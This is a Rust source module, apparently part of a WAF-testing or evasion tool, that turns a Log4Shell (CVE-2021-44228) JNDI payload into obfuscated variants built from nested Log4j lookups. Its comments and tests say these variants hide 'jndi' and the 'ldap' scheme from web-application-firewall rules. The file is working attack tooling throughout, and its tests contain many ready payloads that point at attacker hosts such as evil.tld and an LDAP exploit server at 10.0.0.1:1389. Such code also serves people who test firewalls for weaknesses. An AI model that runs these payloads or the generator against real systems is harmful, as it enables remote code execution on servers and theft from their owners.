//! Log4Shell (CVE-2021-44228) payload-string equivalence + the joint
//! `(payload × delivery)` generator — the log4shell arm of Phase B.
//!
//! The sound equivalence is **Log4j lookup-collapse**: before the JNDI
//! lookup fires, the Log4j 2 interpolator recursively resolves nested
//! `${...}` lookups, and the documented identity lookups each resolve
//! to the literal they spell:
//!   `${lower:J}`→`j`  `${upper:n}`→`N`  `${::-x}`→`x`
//!   `${env:NOPE:-x}`→`x`  `${sys:nope:-x}`→`x`  `${date:'x'}`→`x`
//! So `${jndi:ldap://h/a}` ≡ `${${lower:j}ndi:ldap://h/a}` ≡
//! `${${::-j}${::-n}di:ldap://h/a}` — every form collapses to the SAME
//! interpolated string, hence the SAME JNDI URL the JVM dereferences,
//! while a WAF regex keyed on `jndi:` / `ldap:` matches none of the
//! obfuscated forms.
//!
//! Anti-rig: the exploit's protocol + authority + path
//! (`ldap://attacker.tld/a`) is preserved verbatim and re-verified
//! ([`still_executes`]). Swapping `ldap`→`dns`, or the attacker host,
//! is a *different* exploit and is rejected — equivalence holds only
//! for the spec-defined collapsing lookups, never "any `${}` is fine".

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};

/// Collapse the documented identity/defaulting lookups to the literal
/// they resolve to, repeatedly, until stable. Models the Log4j 2
/// `StrSubstitutor` recursion closely enough that all sound
/// obfuscations fold to one canonical interpolated string.
#[must_use]
pub fn normalize(s: &str) -> String {
    let mut t = s.to_string();
    for _ in 0..32 {
        let before = t.clone();
        // ${lower:X} / ${upper:X}  (single payload char or short run)
        t = collapse(&t, "lower", |x| x.to_ascii_lowercase());
        t = collapse(&t, "upper", |x| x.to_ascii_uppercase());
        // ${::-X}  (empty key, default X)  → X
        t = collapse_default_empty(&t);
        // ${env:NAME:-X} / ${sys:NAME:-X} / ${main:NAME:-X} → X
        for k in ["env", "sys", "main", "java"] {
            t = collapse_default_named(&t, k);
        }
        // ${date:'X'} / ${date:X} → X (literal date pattern text)
        t = collapse_date(&t);
        if t == before {
            break;
        }
    }
    t.to_ascii_lowercase()
}

fn innermost<'a>(s: &'a str, head: &str) -> Option<(usize, usize, &'a str)> {
    // find a `${<head>...}` with no nested `${` inside (innermost).
    // Walk CHAR boundaries only — `s` can carry hostile multibyte
    // input; a `+= 1` byte walk with `s[i..]` panics mid-codepoint.
    let pat = format!("${{{head}");
    let start = s.find(&pat)?;
    let body_start = start + 2; // past ASCII "${" — a valid boundary
    let mut depth = 1;
    for (off, c) in s[body_start..].char_indices() {
        let idx = body_start + off;
        if s[idx..].starts_with("${") {
            // a nested lookup begins here → recurse for the innermost
            return innermost(&s[body_start..], head)
                .map(|(a, b, cc)| (a + body_start, b + body_start, cc));
        }
        if c == '}' {
            depth -= 1;
            if depth == 0 {
                return Some((start, idx + 1, &s[body_start..idx]));
            }
        }
    }
    None
}

fn collapse(s: &str, head: &str, f: impl Fn(&str) -> String) -> String {
    let mut t = s.to_string();
    let mut guard = 0;
    while let Some((a, b, body)) = innermost(&t, head) {
        guard += 1;
        if guard > 64 {
            break;
        }
        let Some(arg) = body.strip_prefix(head).and_then(|r| r.strip_prefix(':')) else {
            break;
        };
        if arg.contains("${") {
            break;
        }
        let rep = f(arg);
        t.replace_range(a..b, &rep);
    }
    t
}

fn collapse_default_empty(s: &str) -> String {
    let mut t = s.to_string();
    let mut guard = 0;
    while let Some(a) = t.find("${::-") {
        guard += 1;
        if guard > 64 {
            break;
        }
        let body_start = a + 5;
        let Some(rel_end) = t[body_start..].find('}') else {
            break;
        };
        let arg = &t[body_start..body_start + rel_end];
        if arg.contains("${") {
            break;
        }
        let rep = arg.to_string();
        t.replace_range(a..body_start + rel_end + 1, &rep);
    }
    t
}

fn collapse_default_named(s: &str, key: &str) -> String {
    let pat = format!("${{{key}:");
    let mut t = s.to_string();
    let mut guard = 0;
    while let Some(a) = t.find(&pat) {
        guard += 1;
        if guard > 64 {
            break;
        }
        let body_start = a + pat.len();
        let Some(rel_end) = t[body_start..].find('}') else {
            break;
        };
        let body = &t[body_start..body_start + rel_end];
        if body.contains("${") {
            break;
        }
        // NAME:-DEFAULT  → DEFAULT (the named var is unset in our model)
        let rep = match body.split_once(":-") {
            Some((_, d)) => d.to_string(),
            None => break,
        };
        t.replace_range(a..body_start + rel_end + 1, &rep);
    }
    t
}

fn collapse_date(s: &str) -> String {
    let mut t = s.to_string();
    let mut guard = 0;
    while let Some(a) = t.find("${date:") {
        guard += 1;
        if guard > 64 {
            break;
        }
        let body_start = a + 7;
        let Some(rel_end) = t[body_start..].find('}') else {
            break;
        };
        let body = &t[body_start..body_start + rel_end];
        if body.contains("${") {
            break;
        }
        let rep = body.trim_matches(['\'', '"']).to_string();
        t.replace_range(a..body_start + rel_end + 1, &rep);
    }
    t
}

/// Extract `(scheme, authority+path)` of the JNDI URL from a collapsed
/// string, e.g. `${jndi:ldap://h/a}` → `("ldap","//h/a")`.
fn jndi_target(collapsed: &str) -> Option<(String, String)> {
    let i = collapsed.find("jndi:")?;
    let after = &collapsed[i + 5..];
    let end = after.find('}').unwrap_or(after.len());
    let url = &after[..end];
    let (scheme, rest) = url.split_once(':')?;
    Some((scheme.to_string(), rest.to_string()))
}

fn is_log4shell(s: &str) -> bool {
    let n = normalize(s);
    n.contains("jndi:")
        && jndi_target(&n).is_some_and(|(sc, _)| {
            matches!(
                sc.as_str(),
                "ldap" | "ldaps" | "rmi" | "dns" | "iiop" | "nis" | "corba"
            )
        })
}

/// True iff `cand` still drives the SAME JNDI fetch (same protocol,
/// authority and path) as the original — the exploit, not just "some
/// `${}`".
#[must_use]
pub fn still_executes(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() || !is_log4shell(original) {
        return false;
    }
    match (
        jndi_target(&normalize(original)),
        jndi_target(&normalize(cand)),
    ) {
        (Some(o), Some(c)) => o == c,
        _ => false,
    }
}

// ── rewrites (interpolator-transparent, WAF-opaque) ────────────────

/// Obfuscate one ASCII letter as a collapsing lookup that resolves to
/// it. Composable and spec-faithful. Every arm folds back to `c` under
/// [`normalize`]; `still_executes` is the backstop, so adding an arm can
/// only add diversity, never unsoundness.
///
/// Arms 6–8 are SECOND-ORDER: the lookup KEYWORD itself is spelled with
/// a collapsing lookup (`${::-l}ower` → `lower`), which defeats a WAF
/// that blocks the literal `${lower:` / `${upper:` prefixes — the
/// inner lookup resolves first (innermost-first recursion), reconstructing
/// the outer keyword only after the regex has already passed.
fn obf_char(c: char, rng: &mut Rng) -> String {
    if !c.is_ascii_alphabetic() {
        return c.to_string();
    }
    let up = c.to_ascii_uppercase();
    let lo = c.to_ascii_lowercase();
    match rng.below(9) {
        0 => format!("${{lower:{up}}}"),
        1 => format!("${{upper:{lo}}}"),
        2 => format!("${{::-{c}}}"),
        3 => format!("${{env:WAFRIFT_UNSET:-{c}}}"),
        4 => format!("${{sys:wafrift.unset:-{c}}}"),
        5 => format!("${{date:'{c}'}}"),
        // second-order: hide the `lower`/`upper`/`env` keyword itself.
        6 => format!("${{${{::-l}}ower:{up}}}"),
        7 => format!("${{${{::-u}}pper:{lo}}}"),
        _ => format!("${{${{::-e}}nv:WAFRIFT_UNSET:-{c}}}"),
    }
}

/// Obfuscate the ASCII-alpha chars of `payload[range]` in place — each,
/// with prob 3/4, replaced by a [`obf_char`] collapsing lookup. The
/// bytes outside `range` (authority, path, delimiters) are preserved
/// verbatim. One primitive for both the `jndi` token and the URL scheme
/// (§7 DEDUP).
fn obf_span(payload: &str, range: std::ops::Range<usize>, rng: &mut Rng) -> String {
    let pre = &payload[..range.start];
    let tok = &payload[range.clone()];
    let post = &payload[range.end..];
    let obf: String = tok
        .chars()
        .map(|c| {
            if c.is_ascii_alphabetic() && rng.chance(3, 4) {
                obf_char(c, rng)
            } else {
                c.to_string()
            }
        })
        .collect();
    format!("{pre}{obf}{post}")
}

/// Locate the URL scheme token (`ldap`/`rmi`/`dns`/…) that follows the
/// literal `jndi:` envelope, as a byte range into `payload`. `None` when
/// the payload's `jndi` is itself already obfuscated or the scheme is not
/// a plain alpha run (we only rewrite clean operator input; the
/// `still_executes` gate guarantees soundness regardless).
fn scheme_range(payload: &str, jndi_end: usize) -> Option<std::ops::Range<usize>> {
    let after = payload[jndi_end..].strip_prefix(':')?;
    let s_start = jndi_end + 1;
    let rel = after.find(':')?; // scheme ends at the `:` before `//`
    let scheme = &after[..rel];
    (!scheme.is_empty() && scheme.chars().all(|c| c.is_ascii_alphabetic()))
        .then_some(s_start..s_start + rel)
}

/// Rewrite the `jndi` token AND/OR the URL scheme into nested-lookup
/// spellings. Authority + path are preserved verbatim. At least one of
/// the two tokens is obfuscated. Returns the variant plus the technique
/// tags that fired (for operator-visible `rules`).
///
/// Obfuscating the SCHEME is the high-value addition: most real-world
/// Log4Shell WAF rules key on `ldap:`/`rmi:`/`jndi:` literally, so a
/// variant that only hid `jndi` still shipped `ldap://` in cleartext.
/// `scheme_range` + `obf_span` close that — and the collapse oracle
/// already proves the result drives the identical JNDI fetch.
fn rw_obfuscate(payload: &str, rng: &mut Rng) -> Option<(String, Vec<&'static str>)> {
    let jpos = payload.find("jndi")?;
    let jend = jpos + 4;
    let scheme = scheme_range(payload, jend);

    let mut do_jndi = rng.chance(3, 4);
    let mut do_scheme = scheme.is_some() && rng.chance(3, 4);
    // guarantee progress: if neither was chosen, force one.
    if !do_jndi && !do_scheme {
        if scheme.is_some() {
            do_scheme = true;
        } else {
            do_jndi = true;
        }
    }

    let mut out = payload.to_string();
    let mut rules: Vec<&'static str> = Vec::new();
    // Scheme sits AFTER `jndi` (higher index); rewrite it first so the
    // `jndi` range stays valid for the second rewrite.
    if do_scheme && let Some(r) = scheme {
        out = obf_span(&out, r, rng);
        rules.push("log4j_scheme_obf");
    }
    if do_jndi {
        out = obf_span(&out, jpos..jend, rng);
        rules.push("log4j_lookup_collapse");
    }
    (out != payload).then_some((out, rules))
}

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::with_capacity(cfg.max);

    if !still_executes(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max
        && attempts < cfg.max * super::ATTEMPT_BUDGET_MULTIPLIER + super::ATTEMPT_BUDGET_FLOOR
    {
        attempts += 1;
        let Some((s, rules)) = rw_obfuscate(payload, &mut rng) else {
            continue;
        };
        if !still_executes(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        crate::grammar::equiv::test_cfg(seed, 40, "X-Api-Version")
    }

    #[test]
    fn documented_obfuscations_collapse_identically() {
        let canon = jndi_target(&normalize("${jndi:ldap://evil.tld/a}")).unwrap();
        for v in [
            "${${lower:j}ndi:ldap://evil.tld/a}",
            "${${upper:j}${lower:n}di:ldap://evil.tld/a}",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.tld/a}",
            "${${env:NOPE:-j}ndi:ldap://evil.tld/a}",
            "${${sys:x:-j}nd${::-i}:ldap://evil.tld/a}",
            "${${date:'j'}ndi:ldap://evil.tld/a}",
        ] {
            assert!(
                still_executes("${jndi:ldap://evil.tld/a}", v),
                "not equiv: {v}"
            );
            assert_eq!(
                jndi_target(&normalize(v)).unwrap(),
                canon,
                "target drift: {v}"
            );
        }
    }

    #[test]
    fn scheme_obfuscation_collapses_to_canonical() {
        // The scheme (`ldap`/`rmi`) hidden behind collapsing lookups must
        // still drive the identical JNDI fetch — the new high-value evasion.
        let canon = jndi_target(&normalize("${jndi:ldap://evil.tld/a}")).unwrap();
        for v in [
            "${jndi:${lower:L}dap://evil.tld/a}",
            "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.tld/a}",
            "${jndi:${::-l}${::-d}${::-a}${::-p}://evil.tld/a}",
            // jndi AND scheme both obfuscated
            "${${::-j}ndi:${lower:L}dap://evil.tld/a}",
            // second-order: the `lower` keyword itself is spelled with a lookup
            "${jndi:${${::-l}ower:L}dap://evil.tld/a}",
        ] {
            assert!(
                still_executes("${jndi:ldap://evil.tld/a}", v),
                "scheme-obf not equiv: {v}"
            );
            assert_eq!(
                jndi_target(&normalize(v)).unwrap(),
                canon,
                "scheme-obf target drift: {v}"
            );
        }
    }

    #[test]
    fn second_order_keyword_obfuscation_collapses() {
        // `${${::-l}ower:J}` → `${lower:J}` → `j` via innermost-first
        // recursion — the construct that defeats a WAF blocking `${lower:`.
        assert_eq!(normalize("${${::-l}ower:J}ndi"), "jndi");
        assert_eq!(normalize("${${::-u}pper:j}NDI"), "jndi");
        assert!(still_executes(
            "${jndi:ldap://h/a}",
            "${${${::-l}ower:J}ndi:ldap://h/a}"
        ));
    }

    #[test]
    fn generator_emits_scheme_hidden_variants() {
        // Capability proof: across seeds the generator MUST produce at least
        // one sound variant whose raw form no longer contains the cleartext
        // scheme `ldap` (a WAF keyed on `ldap:` would pass it), tagged with
        // the scheme-obfuscation technique. Pre-fix the generator only ever
        // hid `jndi`, so `ldap://` always shipped in the clear.
        let atk = "${jndi:ldap://10.0.0.1:1389/Basic/Command/x}";
        let mut found_scheme_hidden = false;
        let mut found_tag = false;
        for seed in 0..40u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(still_executes(atk, &m.payload), "UNSOUND {:?}", m.payload);
                if m.rules.contains(&"log4j_scheme_obf") {
                    found_tag = true;
                    if !m.payload.to_ascii_lowercase().contains("ldap") {
                        found_scheme_hidden = true;
                    }
                }
            }
            if found_scheme_hidden && found_tag {
                break;
            }
        }
        assert!(found_tag, "no variant tagged log4j_scheme_obf");
        assert!(
            found_scheme_hidden,
            "generator never hid the cleartext `ldap` scheme"
        );
    }

    #[test]
    fn protocol_or_host_swap_is_rejected() {
        // different JNDI protocol = different exploit
        assert!(!still_executes(
            "${jndi:ldap://evil.tld/a}",
            "${jndi:dns://evil.tld/a}"
        ));
        // different attacker host = different exploit
        assert!(!still_executes(
            "${jndi:ldap://evil.tld/a}",
            "${jndi:ldap://other.tld/a}"
        ));
        // path/marker must survive
        assert!(!still_executes(
            "${jndi:rmi://h/Exploit}",
            "${jndi:rmi://h/Other}"
        ));
    }

    #[test]
    fn non_log4shell_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("hello", &cfg(1)).is_empty());
        assert!(generate("${env:HOME}", &cfg(1)).is_empty()); // no jndi
    }

    #[test]
    fn deterministic_diverse_and_all_sound() {
        let atk = "${jndi:ldap://10.0.0.1:1389/Basic/Command/Base64/x}";
        let a: Vec<_> = generate(atk, &cfg(7))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        let b: Vec<_> = generate(atk, &cfg(7))
            .into_iter()
            .map(|m| m.payload)
            .collect();
        assert_eq!(a, b);
        assert!(a.iter().collect::<std::collections::HashSet<_>>().len() >= 6);
        for seed in 0..30u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(still_executes(atk, &m.payload), "UNSOUND {:?}", m.payload);
            }
        }
    }
}
